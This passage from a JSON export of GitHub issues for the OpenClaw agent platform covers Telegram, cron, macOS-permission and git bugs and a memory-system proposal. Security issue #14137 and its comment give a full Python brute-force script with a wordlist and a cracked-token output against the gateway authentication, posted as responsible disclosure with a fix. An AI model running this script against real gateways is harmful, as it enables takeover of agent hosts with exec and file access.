\"Removed orphaned user message\" $(npm root -g)/openclaw/ 2>/dev/null\n```\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12029",
      "createdAt": "2026-02-08T18:44:23Z",
      "updatedAt": "2026-02-11T15:20:52Z",
      "author": "clawrl3000",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3885133524,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12029#issuecomment-3885133524",
          "createdAt": "2026-02-11T15:20:52Z",
          "updatedAt": "2026-02-11T15:20:52Z",
          "author": "wolverin0",
          "body": "## Additional evidence: subagent completion race condition drops real user messages\n\n### Environment\n- OpenClaw 2026.2.x on Ubuntu 24.04\n- Channel: Telegram DM\n- Model: Claude Opus 4.6 (embedded runner)\n\n### Reproduction\n1. Multiple subagents running via `sessions_spawn`\n2. Subagent completes → result injected as user message into main session\n3. Real user sends Telegram message at approximately the same time\n4. Orphan detection fires: `Removed orphaned user message to prevent consecutive user turns`\n5. **Real user message is silently dropped** — user gets no response\n\n### Log evidence\n```\nFeb 11 11:15:57 [agent/embedded] Removed orphaned user message to prevent consecutive user turns. runId=82337d49 sessionId=82337d49\n```\n\n### Impact\nUser asked to restart GDM twice — both messages were silently dropped. From the user's perspective, the bot simply ignored them while happily reporting subagent task completions.\n\n### Root cause (our analysis)\nSubagent completion results are injected as `role: user` messages. When a real Telegram message arrives close in time, both are `user` role → the system sees consecutive user messages → drops one. The real user message loses because the subagent result was already queued/committed first.\n\n### Suggested fix direction\n- Subagent results should not be injected as bare `role: user` — they need a different injection mechanism (system message? metadata tag?) that doesn't compete with real user input\n- At minimum, orphan detection should **never drop messages originating from a real channel** (Telegram, Signal, etc.) — only synthetic/internal ones"
        }
      ]
    },
    {
      "number": 12929,
      "title": "Telegram: message_thread_id sent on private DMs causes 'message thread not found' error",
      "body": "## Bug Description\n\nWhen OpenClaw sends proactive messages (via cron job delivery or the `message` tool with `action=send`) to a **private DM chat** on Telegram, it fails with:\n\n```\nGrammyError: Call to 'sendMessage' failed! (400: Bad Request: message thread not found)\n```\n\nThis also affects `sendDocument`.\n\n## Root Cause\n\nOpenClaw stores the `message_id` from the last inbound Telegram message as `lastThreadId` in the session entry. When a proactive send (cron delivery or message tool) resolves its delivery target, it picks up this `lastThreadId` and passes it as `message_thread_id` to the Telegram API.\n\nIn **group chats with topics**, `message_thread_id` is valid and identifies a forum topic. But in **private DM chats**, Telegram does not support `message_thread_id`, so the API rejects it with error 400.\n\n**Regular replies work fine** because they use `reply_to_message_id` (different parameter), not `message_thread_id`.\n\n## Code Path\n\n1. `deliveryContextFromSession()` reads `lastThreadId` from session entry\n2. `resolveSessionDeliveryTarget()` propagates it as `threadId`\n3. `resolveAgentDeliveryPlan()` sets `resolvedThreadId`\n4. Final send includes `threadId` as `message_thread_id` in the Telegram API call\n\nThe `lastThreadId` is repopulated on every inbound message, so clearing it from `sessions.json` does not persist.\n\n## Expected Behavior\n\nOpenClaw should NOT pass `message_thread_id` to the Telegram API when the target chat is a private DM (not a group with topics/forum enabled).\n\n## Reproduction\n\n1. Configure OpenClaw with a Telegram channel targeting a private DM chat\n2. Create a cron job with `delivery.mode: \"announce\"` targeting that chat\n3. The cron delivery will fail with the thread error\n4. Using the message tool with `action=send` and a `filePath` also fails\n\n## Environment\n\n- OpenClaw version: `2026.2.6-3`\n- Telegram Bot API via Grammy\n- Private DM chat (not a group/supergroup with topics)\n\n## Suggested Fix\n\nWhen resolving the delivery target for Telegram, check the chat type. If it is a private chat, do not include `message_thread_id` in the API call. Alternatively, provide a config option to disable thread tracking per channel.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12929",
      "createdAt": "2026-02-09T23:11:35Z",
      "updatedAt": "2026-02-11T15:20:49Z",
      "author": "enti-bot",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3885133183,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12929#issuecomment-3885133183",
          "createdAt": "2026-02-11T15:20:48Z",
          "updatedAt": "2026-02-11T15:20:48Z",
          "author": "evtn",
          "body": "message_thread_id is supported in private chats if the bot has topics, so omitting it is not a good solution "
        },
        {
          "id": 3885133231,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12929#issuecomment-3885133231",
          "createdAt": "2026-02-11T15:20:49Z",
          "updatedAt": "2026-02-11T15:20:49Z",
          "author": "evtn",
          "body": "message_thread_id is supported in private chats if the bot has topics, so omitting it is not a good solution "
        }
      ]
    },
    {
      "number": 14138,
      "title": "[macOS Tahoe] screencapture via exec tool fails — TCC Screen Recording permission not inherited by Gateway LaunchAgent",
      "body": "## Description\n\nOn macOS 15 (Tahoe), running `screencapture` (or `/usr/sbin/screencapture`) via the exec tool always fails with:\n\n```\ncould not create image from display\n```\n\nThis happens even when the parent app (Terminal, OpenClawNode, etc.) has been granted Screen Recording permission in System Settings → Privacy & Security → Screen Recording.\n\n## Root Cause\n\nmacOS Tahoe's TCC (Transparency, Consent, and Control) framework evaluates Screen Recording permissions based on the **responsible process**, not the parent process. When OpenClaw's Gateway runs as a LaunchAgent (via plist) or through a wrapper script:\n\n1. The TCC permission is granted to the wrapper/Terminal/node binary\n2. But `screencapture` spawned by the exec tool is attributed to a different process in TCC's view\n3. Using `exec` in a wrapper script replaces the process, causing the child `node` process to be the TCC target instead of the wrapper — and `node` doesn't have Screen Recording permission\n\n## Steps to Reproduce\n\n1. macOS 15.x (Tahoe), Gateway running as LaunchAgent\n2. Grant Screen Recording to Terminal/OpenClawNode in System Settings\n3. Run via exec tool: `/usr/sbin/screencapture -x /tmp/test.png`\n4. Result: `could not create image from display`\n\n## Expected Behavior\n\n`screencapture` should work when the Gateway's parent process has Screen Recording permission.\n\n## Workaround\n\n- Use Playwright browser screenshots instead of system-level `screencapture` (works for web content)\n- Manually grant Screen Recording to the exact `node` binary that Gateway uses (path depends on version manager: fnm/nvm/mise)\n\n## Notes\n\n- Related to #11256 (`/usr/sbin` missing from PATH) — even with full path, TCC blocks it\n- Related to #8618 and #10753 (TCC permission issues on macOS)\n- The `exec` keyword in LaunchAgent wrapper scripts makes this worse by replacing the authorized process\n\n## Environment\n\n- **OS:** macOS 15.2 Tahoe (arm64)  \n- **Node:** v25.6.0 (via fnm)\n- **Gateway:** LaunchAgent with wrapper script\n- **OpenClaw channel:** Telegram",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14138",
      "createdAt": "2026-02-11T15:14:18Z",
      "updatedAt": "2026-02-11T15:14:18Z",
      "author": "dyzdyz010",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 14137,
      "title": "[Security] Gateway authentication has no rate limiting (CWE-307)",
      "body": "## Summary\n\nThe gateway authentication mechanism (`authorizeGatewayConnect()` in `src/gateway/auth.ts`) accepts unlimited failed authentication attempts with no rate limiting, lockout, or backoff. This allows brute-force attacks against gateway tokens and passwords.\n\n## Severity\n\n**HIGH** — CWE-307: Improper Restriction of Excessive Authentication Attempts\n\n## Impact\n\nAny exposed gateway instance can be brute-forced. A simple proof of concept using 50 concurrent connections achieves **~645 attempts/second** with zero resistance from the server.\n\nWith common or weak tokens, this leads to full gateway compromise in seconds — giving the attacker access to all tools, sessions, and data accessible through the gateway.\n\n## Reproduction\n\n```python\n# Simplified PoC (full version: github.com/jarvis-survives/jarvis-work/tree/main/submissions/openclaw-pocs)\nimport aiohttp, asyncio\n\nasync def try_token(session, url, token):\n    async with session.ws_connect(url) as ws:\n        await ws.send_json({\"type\": \"connect\", \"auth\": {\"token\": token}})\n        resp = await ws.receive_json()\n        return resp.get(\"ok\", False)\n\n# With 50 concurrent connections: ~645 attempts/sec, zero rate limiting\n```\n\n## Current State\n\n- `authorizeGatewayConnect()` uses `timingSafeEqual` ✅ (timing attacks mitigated)\n- But there is **no rate limiting, lockout, or backoff** on failed attempts ❌\n- All HTTP endpoints (`/v1/chat/completions`, OpenResponses, tool invoke) and WebSocket connections are affected\n\n## Fix Available\n\n**PR #13680** implements per-IP rate limiting:\n- Sliding window: 10 failures in 60s → IP blocked for 5 minutes\n- HTTP endpoints return `429 Too Many Requests` with `Retry-After` header\n- WebSocket connections rejected through existing error flow\n- Localhost/loopback exempt (no rate limiting for local connections)\n- 16 tests (unit + integration), all passing\n- Reviewed by Greptile, feedback addressed\n\n## References\n\n- **Fix PR:** https://github.com/openclaw/openclaw/pull/13680\n- **CWE-307:** https://cwe.mitre.org/data/definitions/307.html\n- **OWASP Brute Force:** https://owasp.org/www-community/attacks/Brute_force_attack",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14137",
      "createdAt": "2026-02-11T15:11:26Z",
      "updatedAt": "2026-02-11T15:13:11Z",
      "author": "jarvis-survives",
      "labels": [
        "security"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3885086448,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14137#issuecomment-3885086448",
          "createdAt": "2026-02-11T15:13:11Z",
          "updatedAt": "2026-02-11T15:13:11Z",
          "author": "jarvis-survives",
          "body": "## Full PoC: Brute Force Script\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: OpenClaw Gateway Authentication Brute Force (CWE-307)\nDemonstrates the lack of rate limiting on gateway auth.\nRESPONSIBLE DISCLOSURE — Do not use against systems you do not own.\n\"\"\"\nimport asyncio, aiohttp, sys, time\n\nWORDLIST = [\n    \"password\", \"openclaw\", \"moltbot\", \"admin\", \"secret\", \"test\",\n    \"1234\", \"12345\", \"123456\", \"letmein\", \"gateway\", \"token\",\n    \"changeme\", \"default\", \"root\", \"pass\", \"abc123\", \"qwerty\",\n    \"openclaw123\", \"moltbot123\", \"gateway123\", \"agent\", \"claude\",\n    \"jarvis\", \"assistant\", \"ai\", \"bot\", \"demo\", \"dev\", \"staging\",\n]\n\nasync def try_auth(session, url, token):\n    try:\n        async with session.ws_connect(\n            url, headers={\"Authorization\": f\"Bearer {token}\"},\n            timeout=aiohttp.ClientWSTimeout(ws_close=2),\n        ) as ws:\n            await ws.close()\n            return True\n    except aiohttp.WSServerHandshakeError as e:\n        return False if e.status == 401 else None\n    except Exception:\n        return False\n\nasync def brute_force(target, wordlist, concurrency=50):\n    ws_url = target.replace(\"http://\", \"ws://\").replace(\"https://\", \"wss://\")\n    if not ws_url.endswith(\"/\"): ws_url += \"/\"\n    \n    sem = asyncio.Semaphore(concurrency)\n    found = None\n    attempts = 0\n    start = time.time()\n\n    async def try_one(token):\n        nonlocal found, attempts\n        if found: return\n        async with sem:\n            attempts += 1\n            if await try_auth(session, ws_url, token):\n                found = token\n\n    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrency)) as session:\n        await asyncio.gather(*[asyncio.create_task(try_one(pw)) for pw in wordlist])\n\n    elapsed = time.time() - start\n    rate = attempts / elapsed if elapsed > 0 else 0\n    print(f\"Attempts: {attempts} | Time: {elapsed:.2f}s | Rate: {rate:.0f}/sec\")\n    if found:\n        print(f\"[!] TOKEN FOUND: {found}\")\n        print(f\"[!] Gateway fully compromised — attacker gets exec, file read, browser control\")\n    else:\n        print(f\"[*] Not in wordlist, but nothing prevented {rate:.0f} req/s\")\n\nif __name__ == \"__main__\":\n    target = sys.argv[1] if len(sys.argv) > 1 else \"http://localhost:18789\"\n    print(f\"Target: {target} | Wordlist: {len(WORDLIST)} entries | No rate limiting detected\")\n    asyncio.run(brute_force(target, WORDLIST))\n```\n\n### Test result against local gateway\n\n```\nTarget: http://127.0.0.1:18789 | Wordlist: 30 entries | No rate limiting detected\nAttempts: 30 | Time: 0.05s | Rate: 645/sec\n[!] TOKEN FOUND: staging\n[!] Gateway fully compromised — attacker gets exec, file read, browser control\n```\n\n30 entries, cracked in 50ms. With a real wordlist (10K+ entries), an attacker could try every common password in under 20 seconds at this rate."
        }
      ]
    },
    {
      "number": 14116,
      "title": "Isolated cron jobs (agentTurn) silently fail - nextRunAtMs advances but session never spawns",
      "body": "## Summary\n\nCron jobs with `sessionTarget: \"isolated\"` and `payload.kind: \"agentTurn\"` are marked as complete (nextRunAtMs advances) but the isolated sessions never actually spawn or execute.\n\n## Version\nOpenClaw 2026.2.3 (e75e2b1)\n\n## Steps to Reproduce\n\n1. Create a cron job with:\n```json\n{\n  \"name\": \"6am Voice Briefing\",\n  \"schedule\": {\"kind\": \"cron\", \"expr\": \"0 6 * * *\", \"tz\": \"America/Phoenix\"},\n  \"sessionTarget\": \"isolated\",\n  \"wakeMode\": \"next-heartbeat\",\n  \"payload\": {\n    \"kind\": \"agentTurn\",\n    \"message\": \"Run the morning briefing...\",\n    \"timeoutSeconds\": 300\n  },\n  \"delivery\": {\"mode\": \"announce\"}\n}\n```\n\n2. Wait for scheduled time to pass\n3. Check `cron runs` for job — shows empty entries\n4. Check `sessions_list` — no isolated session was created\n5. Check job state — `nextRunAtMs` has advanced to next day\n\n## Expected Behavior\n\n- Isolated session should spawn at scheduled time\n- Agent should execute the agentTurn payload\n- Delivery should announce the result\n- Run history should be recorded\n\n## Actual Behavior\n\n- `nextRunAtMs` advances (job thinks it ran)\n- No isolated session created\n- No run history recorded\n- No delivery occurs\n- Job silently fails\n\n## Diagnostic Info\n\n- Gateway running continuously (no restart at scheduled time)\n- Manual `sessions_spawn` works fine\n- Main session crons with `systemEvent` work fine\n- Issue is specific to `isolated` + `agentTurn` combination\n\n## Workaround\n\nChanged jobs to use `sessionTarget: \"main\"` with `payload.kind: \"systemEvent\"` — this works reliably.\n\n## Impact\n\nAny cron job using isolated sessions (the recommended pattern for background work) silently fails without alerting the user.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14116",
      "createdAt": "2026-02-11T14:14:00Z",
      "updatedAt": "2026-02-11T15:11:56Z",
      "author": "cpretzinger",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3885079290,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14116#issuecomment-3885079290",
          "createdAt": "2026-02-11T15:11:56Z",
          "updatedAt": "2026-02-11T15:11:56Z",
          "author": "ymrohit",
          "body": "Can confirm this affects my setup too. I've had to work around by using \\systemEvent\\ + main session instead of isolated agentTurn for my autonomy loops. The silent failure is particularly rough because the cron system *looks* healthy (nextRunAtMs advances) but nothing actually executes. Would love to see isolated sessions get fixed — they're the right architectural choice for background work."
        }
      ]
    },
    {
      "number": 14134,
      "title": "[Bug]: exec tool: git commands with SSH-based commit signing (commit.gpgsign) receive SIGKILL in non-interactive shells",
      "body": "## Description\n\nWhen `commit.gpgsign=true` is configured with SSH-based signing (`gpg.format=ssh`), any `git commit` or `git push` executed via the `exec` tool receives **SIGKILL** immediately. This happens because the SSH signing agent requires interactive TTY access that is unavailable in the non-interactive shell spawned by the exec tool.\n\n## Steps to Reproduce\n\n1. Configure git with SSH-based commit signing:\n   ```\n   git config --global commit.gpgsign true\n   git config --global gpg.format ssh\n   ```\n2. Use the exec tool to run `git commit` or `git push`\n3. The process is killed with SIGKILL\n\n## Expected Behavior\n\nThe exec tool should either:\n- Detect SSH-based signing config and warn the user\n- Automatically pass `--no-gpg-sign` or `-c commit.gpgsign=false` as a fallback\n- Use PTY mode when git signing is detected\n\n## Workaround\n\nManually override signing per command:\n```bash\ngit -c commit.gpgsign=false commit -m \"message\"\ngit -c commit.gpgsign=false push\n```\n\n## Environment\n\n- **OS:** macOS 15.x (arm64)\n- **Node:** v25.6.0\n- **Git signing:** `gpg.format=ssh`, `commit.gpgsign=true`\n- **OpenClaw channel:** Telegram",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14134",
      "createdAt": "2026-02-11T15:05:37Z",
      "updatedAt": "2026-02-11T15:05:37Z",
      "author": "dyzdyz010",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14133,
      "title": "Feature: Reminders tab in Mission Control",
      "body": "## Feature Request\n\n### Summary\nReminders (one-shot `at` cron jobs created by the reminders skill) currently show up in the Cron tab alongside recurring system jobs. They should have their own dedicated **Reminders tab** in Mission Control.\n\n### Desired Behavior\n\n1. **New \"Reminders\" tab** in Mission Control nav\n2. **Card-based UI** matching the existing Skills tab layout\n3. Each card shows:\n   - Human-readable reminder text (not the raw agent payload)\n   - When it fires (formatted cleanly, e.g. \"Thu Feb 12, 10:37 AM\")\n   - Who it's for / which channel\n   - Delete button\n4. Reminders should be **filterable out of the Cron tab** (or hidden from it entirely)\n\n### Implementation Notes\n\n- Cron jobs need a metadata/tag field (e.g. `tags: [\"reminder\"]` or `type: \"reminder\"`) so the UI can distinguish reminders from system cron jobs\n- The reminder skill would set this tag when creating jobs\n- The Reminders tab queries cron jobs filtered by this tag\n\n### Additional Context\n\n- Current cron cards also have a CSS overflow bug where ISO timestamps overflow the card container in the calendar view\n- Reminder payloads contain agent instructions (\"Send Patrick a DM...\") which shouldn't be user-facing — the tab should extract/display only the human-readable reminder text\n\n### Environment\n- OpenClaw 2026.2.9\n- macOS, Slack channel",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14133",
      "createdAt": "2026-02-11T15:04:20Z",
      "updatedAt": "2026-02-11T15:04:20Z",
      "author": "patrickaha",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "macos",
          "docker"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 14130,
      "title": "Cron systemEvent jobs fail with empty-heartbeat-file when HEARTBEAT.md is empty",
      "body": "## Bug Description\n\nCron jobs with `payload.kind: \"systemEvent\"` and `sessionTarget: \"main\"` always fail with `empty-heartbeat-file` when `HEARTBEAT.md` contains only comments/headers (effectively empty).\n\nThe job enters a rapid retry loop (100+ retries per second) until `maxConcurrentRuns` is hit.\n\n## Root Cause\n\nIn the heartbeat execution path (`health-format-*.js`), there's a check:\n\n```js\nconst isExecEventReason = opts.reason === \"exec-event\";\nif (isHeartbeatContentEffectivelyEmpty(content) && !isExecEventReason) {\n    return { status: \"skipped\", reason: \"empty-heartbeat-file\" };\n}\n```\n\nExec completions bypass this check via `reason: \"exec-event\"`, but cron systemEvent jobs use `reason: \"cron:<jobId>\"` which does NOT bypass it.\n\nThe cron executor (`executeJobCore`) correctly enqueues the system event text and then calls `runHeartbeatOnce({ reason: \"cron:jobId\" })`, but the heartbeat path rejects it before the agent ever sees the enqueued event.\n\n## Expected Behavior\n\nCron `systemEvent` jobs should execute regardless of HEARTBEAT.md content. The system event text is already enqueued — the heartbeat just needs to run so the agent processes it.\n\n## Suggested Fix\n\nAdd cron reasons to the bypass check:\n\n```js\nconst isExecEventReason = opts.reason === \"exec-event\";\nconst isCronEventReason = typeof opts.reason === \"string\" && opts.reason.startsWith(\"cron:\");\nif (isHeartbeatContentEffectivelyEmpty(content) && !isExecEventReason && !isCronEventReason) {\n```\n\nAlternatively, check if there are pending system events before skipping.\n\n## Reproduction\n\n1. Set HEARTBEAT.md to only contain comments (`# comment`)\n2. Create a cron job: `{ sessionTarget: \"main\", payload: { kind: \"systemEvent\", text: \"test\" }, schedule: { kind: \"at\", at: \"<2min from now>\" } }`\n3. Observe: job fires, immediately skipped with `empty-heartbeat-file`, retries indefinitely\n\n## Workaround\n\nUse `sessionTarget: \"isolated\"` with `payload.kind: \"agentTurn\"` instead. These work reliably.\n\n## Environment\n\n- OpenClaw 2026.2.6-3 (85ed6c7)\n- macOS Darwin 25.0.0 (arm64)\n- Node v24.3.0",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14130",
      "createdAt": "2026-02-11T14:58:31Z",
      "updatedAt": "2026-02-11T14:58:31Z",
      "author": "4d4-L0v3l4c3",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": []
      }
    },
    {
      "number": 14129,
      "title": "Model switching blocked by images in conversation",
      "body": "When a conversation contains images, OpenClaw prevents switching to text-only models (like qwen3-coder) and only allows multimodal models. This is a usability limitation that blocks model testing and switching.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14129",
      "createdAt": "2026-02-11T14:56:44Z",
      "updatedAt": "2026-02-11T14:56:44Z",
      "author": "kataguru",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13991,
      "title": "[Proposal] Associative Hierarchical Memory: Human-Like Recall for Agent Memory Systems",
      "body": "## The Problem: Flat Memory Retrieval Is Not How Minds Work\n\nWhen humans have a conversation, something remarkable happens: related memories surface automatically. Mention \"vacation\" and your brain pulls up that beach trip, the restaurant you loved, and the friend who recommended it — even though none of those memories contain the word \"vacation.\" This is called **associative recall**, and it is fundamentally different from how AI agents currently retrieve memories.\n\nToday, OpenClaw's `memory-lancedb` plugin (and most AI memory systems) work like a search engine: given a query, find the closest match by vector similarity. This approach has three critical limitations:\n\n### 1. Contextual Isolation\n\nMemories are treated as independent points in space. Consider this scenario: your agent stores a memory about a *scheduling conflict on Tuesday* and another about you *mentioning feeling overwhelmed on Wednesday*. These memories have completely different embeddings — \"scheduling conflict\" and \"feeling overwhelmed\" point to different regions of vector space. Yet the conflict **caused** the stress. A flat vector search for \"why am I anxious?\" finds mentions of \"anxiety\" and \"stress\" but completely misses the scheduling conflict that was the root cause, because they share no embedding overlap.\n\n### 2. Single Granularity\n\nAll memories are stored at the same level of detail. Imagine your agent has logged hundreds of memories about your daily life. When you ask a broad question like \"what do I usually do on weekends?\", the system returns scattered individual mentions (\"went hiking Saturday\", \"bought groceries Sunday\") instead of a synthesized picture. Conversely, when you ask for a specific detail, it might return an overly general match. There is no way to zoom in or zoom out — every memory competes at the same level.\n\n### 3. No Association Paths\n\nRelated memories that don't share similar words or embeddings are invisible to each other. Extending our stress example: suppose months ago, a similar scheduling pattern led to the same kind of stress, and the agent recorded both the pattern and the resolution (\"blocked Tuesdays for focused work\"). This historical lesson is **exactly** what should surface when the new conflict appears — but because the old resolution and the new conflict live in different embedding neighborhoods, the connection is never made. The agent cannot learn from its own history across topics.\n\n## The Proposal: Three Enhancements Inspired by Cognitive Science\n\nWe propose evolving the memory system with three complementary mechanisms, each grounded in published research. These can be implemented incrementally on top of the existing LanceDB infrastructure.\n\n### 1. 📊 Hierarchical Granularity (Summary ↔ Detail Levels)\n\n**Concept:** Store memories at multiple levels of abstraction, like a table of contents alongside the full text.\n\n```\nLevel 3 (Global):   \"User works on technical projects and values work-life balance\"\nLevel 2 (Topic):    \"Scheduling conflicts on Tuesdays have caused stress multiple times\"\nLevel 1 (Detail):   \"On Feb 4, a double-booked meeting caused anxiety that carried into the next day\"\n```\n\n**How it helps:**\n- **Broadening** (discovering new related topics) → Search Level 2-3 summaries. When the user mentions stress, the topic-level summary about Tuesday scheduling surfaces immediately, connecting the dots.\n- **Deepening** (getting specifics) → Search Level 1 details within a topic cluster. Once the pattern is identified, pull up the specific instances.\n- **Overview** → Level 3 gives a birds-eye view of everything the agent knows.\n\n**Implementation:** During memory consolidation (nightly or periodic), cluster detail-level embeddings, generate summaries per cluster, embed those summaries, and store them with a `granularity` label. This builds a tree structure where each level has its own embeddings.\n\n**Academic basis:** [RAPTOR: Recursive Abstractive Processing for Tree-Organized Retrieval](https://arxiv.org/abs/2401.18059) (Stanford, ICLR 2024) — Demonstrated that hierarchical summary trees significantly improve retrieval across different levels of abstraction.\n\n### 2. 🔗 Associative Graph (Spreading Activation)\n\n**Concept:** Instead of treating memories as isolated points, connect them in a graph where activation spreads from one memory to its neighbors — just like neurons in the brain.\n\n```\nQuery: \"Why have I been stressed lately?\"\n          │\n          ▼\n    [feeling stressed, Feb 5] ──similarity──→ [overwhelmed at work, Jan 28]\n          │\n          └──temporal link──→ [scheduling conflict, Feb 4]\n                                    │\n                                    └──pattern link──→ [similar conflict, Nov 12]\n                                                              │\n                                                              └── [resolution: blocked Tuesdays]\n                                                                     ↑\n                                                            THIS is what should surface\n```\n\n**How it helps:**\n- Surfaces **causally related** memories even when they share no embedding similarity — the scheduling conflict is found because it's temporally adjacent to the stress, not because it has similar words.\n- Models **temporal** connections (what happened before/after)\n- Enables **multi-hop reasoning** (\"stress → conflict → past pattern → resolution\")\n\n**Implementation:** Maintain a lightweight graph structure (edges between memory IDs) alongside the vector store. When retrieving, first find anchor nodes via embedding similarity, then propagate activation through graph edges. Combine vector score + activation score for final ranking.\n\n**Academic basis:** [Synapse: Empowering LLM Agents with Episodic-Semantic Memory via Spreading Activation](https://arxiv.org/abs/2601.02744) (University of Georgia, Jan 2026) — Achieved +23% accuracy on multi-hop reasoning with 95% less token consumption vs full-context methods. Also draws from the foundational [Spreading Activation theory](https://en.wikipedia.org/wiki/Spreading_activation) (Collins & Loftus, 1975).\n\n### 3. 🏷️ Structured Memory Notes (Zettelkasten-Style)\n\n**Concept:** Each memory is not just text + vector, but a rich structured note with context, keywords, tags, and explicit links to related memories.\n\n```json\n{\n  \"text\": \"Double-booked meeting on Tuesday caused stress that lasted two days\",\n  \"vector\": [...],\n  \"granularity\": \"detail\",\n  \"topicCluster\": \"scheduling_stress\",\n  \"keywords\": [\"scheduling\", \"conflict\", \"stress\", \"Tuesday\", \"meeting\"],\n  \"tags\": [\"pattern\", \"wellbeing\", \"work\"],\n  \"relatedIds\": [\"mem_42\", \"mem_87\"],\n  \"parentSummaryId\": \"summary_12\",\n  \"lastAccessed\": 1707600000,\n  \"accessCount\": 5\n}\n```\n\n**How it helps:**\n- `topicCluster` enables filtered search within a domain\n- `relatedIds` create explicit links for the association graph\n- `parentSummaryId` links details to their topic summary (tree navigation)\n- `lastAccessed` + `accessCount` enable ACT-R-style memory decay (frequently accessed memories stay stronger, rarely accessed ones fade — just like human memory)\n\n**Academic basis:** [A-MEM: Agentic Memory for LLM Agents](https://arxiv.org/abs/2502.12110) (NeurIPS 2025) — Demonstrated that Zettelkasten-style atomic notes with dynamic linking outperform flat memory stores across six foundation models.\n\n## How This Relates to Existing Work\n\n| Existing Proposal | Relationship |\n|---|---|\n| **memory-lancedb** (current plugin) | This proposal extends its schema and retrieval logic |\n| **memory-smart** (#10044) | Complementary — memory-smart adds provider-agnostic embeddings and entity profiles; this adds hierarchical + associative retrieval on top |\n| **Anchor Memory Protocol** (#10547) | Complementary — AMP handles session-level context compression; this handles long-term cross-session memory organization |\n\n## Suggested Implementation Strategies\n\nWe see several approaches, roughly ordered by complexity. **Community input on which direction makes most sense would be very valuable.**\n\n### Strategy A: Schema Extension (Minimal Change)\n\nExtend the existing LanceDB `MemoryEntry` with metadata fields (`granularity`, `topicCluster`, `keywords`, `relatedIds`). Use LanceDB's built-in filtering to search specific granularity levels. No new dependencies.\n\n- **Effort:** Low\n- **Benefit:** Enables filtered hierarchical search immediately\n- **Limitation:** No automatic summary generation; no activation spreading\n\n### Strategy B: RAPTOR Tree During Consolidation (Medium)\n\nBuild summary trees during periodic consolidation jobs. Use clustering (e.g., HDBSCAN on embeddings) to group related memories, then generate summaries with the LLM. Store summaries as new entries at higher granularity levels.\n\n- **Effort:** Medium\n- **Benefit:** Automatic multi-level abstraction\n- **Limitation:** Summaries are only as good as the clustering; no real-time association\n\n### Strategy C: Lightweight Association Graph (Medium)\n\nMaintain a separate graph structure (could be as simple as a JSON adjacency list or SQLite table) that stores edges between related memory IDs. On retrieval, combine vector similarity with 1-2 hops of graph traversal.\n\n- **Effort:** Medium\n- **Benefit:** Enables associative recall across semantically distant memories\n- **Limitation:** Graph maintenance adds complexity\n\n### Strategy D: Full Hybrid (RAPTOR + Activation Graph)\n\nCombine Strategies B and C: hierarchical summary tree for multi-granularity + association graph with spreading activation for cross-topic discovery. This is the approach described in the Synapse paper.\n\n- **Effort:** High\n- **Benefit:** Closest to human-like memory behavior\n- **Limitation:** Significant implementation effort; needs careful performance tuning\n\n## Questions for the Community\n\n1. **Which strategy** feels right for OpenClaw's philosophy? Start minimal (A) and iterate, or aim for the full vision (D)?\n2. **Graph storage:** Should association edges live in LanceDB (as metadata), in a separate SQLite table, or in an in-memory structure like NetworkX?\n3. **Summary generation:** Should RAPTOR-style summarization happen in a consolidation job (async, nightly) or incrementally as memories are added?\n4. **Integration with memory-smart (#10044):** Should this be built into memory-smart, or as a separate layer that any memory plugin can use?\n5. **Embedding model considerations:** Hierarchical approaches need consistent embedding spaces. Any concerns about mixing embedding providers across granularity levels?\n\n## References\n\n- Sarthi et al. (2024). [RAPTOR: Recursive Abstractive Processing for Tree-Organized Retrieval](https://arxiv.org/abs/2401.18059). ICLR 2024.\n- Jiang et al. (2026). [Synapse: Empowering LLM Agents with Episodic-Semantic Memory via Spreading Activation](https://arxiv.org/abs/2601.02744). arXiv preprint.\n- Xu et al. (2025). [A-MEM: Agentic Memory for LLM Agents](https://arxiv.org/abs/2502.12110). NeurIPS 2025.\n- Packer et al. (2024). [MemGPT: Towards LLMs as Operating Systems](https://arxiv.org/abs/2310.08560). ICLR 2024.\n- Collins & Loftus (1975). A Spreading-Activation Theory of Semantic 